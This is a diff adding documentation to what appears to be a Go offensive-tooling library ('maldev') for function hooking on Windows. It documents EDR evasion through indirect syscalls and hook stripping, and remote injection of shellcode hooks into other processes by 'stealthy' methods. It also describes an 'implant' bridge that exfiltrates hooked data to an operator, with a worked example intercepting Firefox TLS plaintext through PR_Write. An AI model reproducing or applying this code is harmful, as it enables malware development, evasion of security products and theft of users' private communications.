@@ -324,6 +324,354 @@ for _, sym := range imports {
 This tells you exactly which functions the target uses — you can then look
 up each one's signature by name.
 
+## Hook Options
+
+`Install` and `InstallByName` accept variadic `HookOption` values:
+
+| Option | Effect |
+|--------|--------|
+| `WithCaller(caller)` | Route the memory-patch syscall through a `*wsyscall.Caller` for indirect/direct syscall dispatch (EDR evasion) |
+| `WithCleanFirst()` | Re-read the target function prologue from disk before patching, stripping any EDR hook already present |
+
+```go
+caller := wsyscall.New(wsyscall.MethodIndirect,
+    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()))
+
+h, err := hook.InstallByName("ntdll.dll", "NtWriteFile", myHandler,
+    hook.WithCaller(caller),   // use indirect syscalls for the patch
+    hook.WithCleanFirst(),     // evict EDR hook first
+)
+```
+
+Both options compose: `WithCleanFirst` strips the EDR hook via `unhook.ClassicUnhook`, then `WithCaller` writes the new patch through the indirect-syscall path.
+
+---
+
+## InstallProbe — Unknown Signatures
+
+When you don't know a function's parameter types or count, use `InstallProbe`.
+It hooks with a 18-`uintptr` handler, calls the original transparently, and
+delivers a `ProbeResult` to your callback on every call.
+
+```go
+func Install​Probe(targetAddr uintptr, onCall func(ProbeResult), opts ...HookOption) (*Hook, error)
+func Install​ProbeByName(dllName, funcName string, onCall func(ProbeResult), opts ...HookOption) (*Hook, error)
+```
+
+### ProbeResult
+
+```go
+type ProbeResult struct {
+    Args [18]uintptr
+    Ret  uintptr
+}
+
+func (r ProbeResult) NonZeroArgs() []int  // indices of non-zero args
+func (r ProbeResult) NonZeroCount() int   // count of non-zero args
+```
+
+### Example: discover parameters of an unknown function
+
+```go
+h, err := hook.InstallProbeByName("somelib.dll", "UnknownFunc",
+    func(r hook.ProbeResult) {
+        log.Printf("called: %d non-zero args at indices %v",
+            r.NonZeroCount(), r.NonZeroArgs())
+        // Inspect r.Args[0], r.Args[1], ... to understand the ABI.
+    },
+)
+if err != nil {
+    log.Fatal(err)
+}
+defer h.Remove()
+```
+
+Call the target binary and observe which argument slots light up. Once you
+have a count, switch to a typed `Install` handler.
+
+---
+
+## HookGroup — Multi-Hook
+
+`HookGroup` installs a set of hooks atomically: if any installation fails,
+all previously installed hooks in the group are removed before the error is
+returned, so the process never ends up in a half-hooked state.
+
+```go
+func InstallAll(targets []Target, opts ...HookOption) (*HookGroup, error)
+
+type Target struct {
+    DLL     string
+    Func    string
+    Handler interface{}
+}
+
+func (g *HookGroup) RemoveAll() error
+func (g *HookGroup) Hooks() []*Hook
+```
+
+### Example: hook all Winsock send/recv at once
+
+```go
+var (
+    hSend *hook.Hook
+    hRecv *hook.Hook
+)
+
+g, err := hook.InstallAll([]hook.Target{
+    {DLL: "ws2_32.dll", Func: "send",
+        Handler: func(s, buf, len, flags uintptr) uintptr {
+            log.Printf("send: %d bytes", len)
+            r, _, _ := syscall.SyscallN(hSend.Trampoline(), s, buf, len, flags)
+            return r
+        },
+    },
+    {DLL: "ws2_32.dll", Func: "recv",
+        Handler: func(s, buf, len, flags uintptr) uintptr {
+            log.Printf("recv: %d bytes", len)
+            r, _, _ := syscall.SyscallN(hRecv.Trampoline(), s, buf, len, flags)
+            return r
+        },
+    },
+})
+if err != nil {
+    log.Fatal(err) // both hooks rolled back on any failure
+}
+// Populate trampoline references after group install.
+hSend = g.Hooks()[0]
+hRecv = g.Hooks()[1]
+defer g.RemoveAll()
+```
+
+---
+
+## PE Import Analysis
+
+`pe/imports` enumerates the IAT (Import Address Table) of any PE on disk —
+no process access required. Use it to discover which functions a target
+binary imports so you know what to hook.
+
+```go
+// List every import in an executable.
+func List(pePath string) ([]Import, error)
+
+// Filter to a single DLL.
+func ListByDLL(pePath, dllName string) ([]Import, error)
+
+// Parse from an io.ReaderAt (e.g. in-memory PE).
+func FromReader(r io.ReaderAt) ([]Import, error)
+
+type Import struct {
+    DLL      string
+    Function string
+}
+```
+
+### Example: find hookable network functions in a target
+
+```go
+import "github.com/oioio-space/maldev/pe/imports"
+
+imps, err := imports.ListByDLL(`C:\Program Files\target\app.exe`, "ws2_32.dll")
+if err != nil {
+    log.Fatal(err)
+}
+for _, imp := range imps {
+    fmt.Printf("%s!%s\n", imp.DLL, imp.Function)
+}
+// ws2_32.dll!connect
+// ws2_32.dll!send
+// ws2_32.dll!recv
+// ws2_32.dll!WSASend
+```
+
+---
+
+## Remote Hooking
+
+`RemoteInstall` injects a shellcode hook handler into another process. The
+patching itself happens inside the target process (the shellcode is
+responsible for installing the hook once loaded). Compose with `GoHandler`
+to turn a Go hook DLL into position-independent shellcode via Donut.
+
+```go
+// Inject shellcode handler into a process by PID.
+func RemoteInstall(pid uint32, dllName, funcName string, shellcodeHandler []byte, opts ...RemoteOption) error
+
+// Resolve process name to PID, then call RemoteInstall.
+func RemoteInstallByName(processName, dllName, funcName string, shellcodeHandler []byte, opts ...RemoteOption) error
+
+// Convert a Go hook DLL on disk to PIC shellcode.
+func GoHandler(dllPath, entryPoint string) ([]byte, error)
+
+// Convert a Go hook DLL already loaded in memory to PIC shellcode.
+func GoHandlerBytes(dllBytes []byte, entryPoint string) ([]byte, error)
+
+// Override the injection method (default: CreateRemoteThread).
+func WithMethod(m inject.Method) RemoteOption
+```
+
+All 15+ injection methods from `inject/` are available via `WithMethod`.
+
+### Example workflow: hook `PR_Write` in Firefox
+
+```go
+// 1. Build the hook DLL (go build -buildmode=c-shared -o hook.dll ./hookcmd)
+sc, err := hook.GoHandler(`hook.dll`, "InstallHook")
+if err != nil {
+    log.Fatal(err)
+}
+
+// 2. Inject into the running process using a stealthy method.
+err = hook.RemoteInstallByName("firefox.exe", "nss3.dll", "PR_Write", sc,
+    hook.WithMethod(inject.MethodEarlyBirdAPC),
+)
+if err != nil {
+    log.Fatal(err)
+}
+// Firefox's TLS layer (nss3.dll!PR_Write) is now intercepted.
+```
+
+---
+
+## Shellcode Templates
+
+`evasion/hook/shellcode` provides tiny x64 stubs for use with `RemoteInstall`
+when you want a pre-canned behaviour without writing a full hook DLL.
+
+```go
+// Block() — always returns 0 (FALSE). 3 bytes: XOR EAX,EAX; RET
+func Block() []byte
+
+// Nop(addr) — calls original function unchanged via JMP to trampoline. 13 bytes.
+func Nop(trampolineAddr uintptr) []byte
+
+// Replace(val) — returns a fixed value. 11 bytes: MOV RAX,imm64; RET
+func Replace(returnValue uintptr) []byte
+
+// Redirect(addr) — unconditional JMP to another address. 13 bytes.
+func Redirect(targetAddr uintptr) []byte
+```
+
+### Example: silently block a single API in a remote process
+
+```go
+import "github.com/oioio-space/maldev/evasion/hook/shellcode"
+
+// Block all CreateFile calls in notepad.exe — returns 0 with no side-effects.
+err := hook.RemoteInstallByName("notepad.exe", "kernel32.dll", "CreateFileW",
+    shellcode.Block(),
+)
+```
+
+---
+
+## Bridge Control API
+
+The `evasion/hook/bridge` package provides a bidirectional IPC channel between
+a hook handler running inside a target process and an operator listener outside
+(or in a separate goroutine).
+
+### Modes
+
+| Mode | How | When to use |
+|------|-----|-------------|
+| **Standalone** | `bridge.Standalone()` | Hook runs autonomously — all `Ask` calls return `Allow` automatically |
+| **Connected** | `bridge.Connect(conn)` | Hook sends events to a live listener for real-time decisions |
+
+### Controller (hook handler side)
+
+```go
+// Standalone — no comms, all decisions auto-allow.
+c := bridge.Standalone()
+
+// Connected — bidirectional channel to a Listener.
+c := bridge.Connect(conn)
+
+// Send a tagged call for approval; blocks until listener replies.
+// Returns Allow on any transport error (fail-open).
+decision := c.Ask("tag", data) // returns Allow | Block | Modify
+
+// Send a free-form log message to the listener.
+c.Log("format %s", value)
+
+// Exfiltrate tagged binary data to the listener.
+c.Exfil("tag", data)
+
+// Call the original function via trampoline.
+ret := c.CallOriginal(args...)
+```
+
+Decisions:
+
+```go
+bridge.Allow  // pass through to original
+bridge.Block  // suppress the call
+bridge.Modify // caller adjusts args/return before forwarding
+```
+
+### Listener (operator side)
+
+```go
+conn, _ := bridge.DialTCP("127.0.0.1:9000", 5*time.Second)
+l := bridge.NewListener(conn)
+
+l.OnCall(func(c bridge.Call) bridge.Decision {
+    log.Printf("[%s] %x", c.Tag, c.Data)
+    return bridge.Allow
+})
+l.OnExfil(func(tag string, data []byte) {
+    log.Printf("exfil[%s]: %d bytes", tag, len(data))
+})
+l.OnLog(func(msg string) { log.Println(msg) })
+
+go l.Serve() // blocks until connection closed
+defer l.Close()
+```
+
+### Transport
+
+```go
+// Named pipe (Windows — low footprint, no network traffic).
+conn, err := bridge.DialPipe(`\\.\pipe\hookbridge`, 5*time.Second)
+
+// TCP (cross-host or cross-process).
+conn, err := bridge.DialTCP("127.0.0.1:9000", 5*time.Second)
+```
+
+### Example: TLS interception via PR_Write hook
+
+```go
+// --- implant side (inside target process, hook DLL) ---
+c := bridge.Connect(conn)
+
+hook.InstallByName("nss3.dll", "PR_Write",
+    func(fd, buf, amount uintptr) uintptr {
+        data := unsafe.Slice((*byte)(unsafe.Pointer(buf)), amount)
+        c.Exfil("pr_write", data)                     // send plaintext to operator
+        d := c.Ask("pr_write_allow", data)             // ask for approval
+        if d == bridge.Block {
+            return 0
+        }
+        r, _, _ := syscall.SyscallN(h.Trampoline(), fd, buf, amount)
+        return r
+    },
+)
+
+// --- operator side (separate process) ---
+conn, _ := bridge.DialTCP("127.0.0.1:9000", 5*time.Second)
+l := bridge.NewListener(conn)
+l.OnExfil(func(tag string, data []byte) {
+    fmt.Printf("[TLS plaintext] %s\n", data)
+})
+l.OnCall(func(c bridge.Call) bridge.Decision {
+    return bridge.Allow // let all writes through
+})
+go l.Serve()
+```
+
+---
+
 ## Advantages & Limitations
 
 | Aspect | Detail |
@@ -333,9 +681,18 @@ up each one's signature by name.
 | **RIP fixup** | RIP-relative instructions patched in trampoline |
 | **Trampoline** | Original function remains callable |
 | **Max params** | ~18 uintptr parameters (NewCallback limit) |
-| **Scope** | Current process only |
+| **Scope** | Current process only (use `RemoteInstall` for other processes) |
 | **Thread safety** | Brief race window during patch (non-atomic write) |
 | **Go runtime** | Don't hook NtClose, NtCreateFile, NtReadFile, NtWriteFile |
+| **WithCaller** | Routes memory-patch through indirect/direct syscalls to evade EDR write monitors |
+| **WithCleanFirst** | Strips existing EDR hook from disk image before installing yours |
+| **InstallProbe** | Signature-agnostic probe; captures all 18 arg slots, zero overhead on unknown ABIs |
+| **HookGroup** | Atomic multi-hook install with rollback — no partial state on failure |
+| **RemoteInstall** | Injects hook handler into another process via any of 15+ injection methods |
+| **GoHandler** | Converts Go hook DLL to PIC shellcode via Donut (no separate toolchain needed) |
+| **shellcode templates** | `Block` / `Nop` / `Replace` / `Redirect` — tiny PIC stubs for remote hooks |
+| **Bridge (standalone)** | Autonomous hook with no comms; `Ask` always returns `Allow` |
+| **Bridge (connected)** | Real-time operator control over allow/block/modify decisions via named pipe or TCP |
 
 ## Comparison with evasion/unhook
 
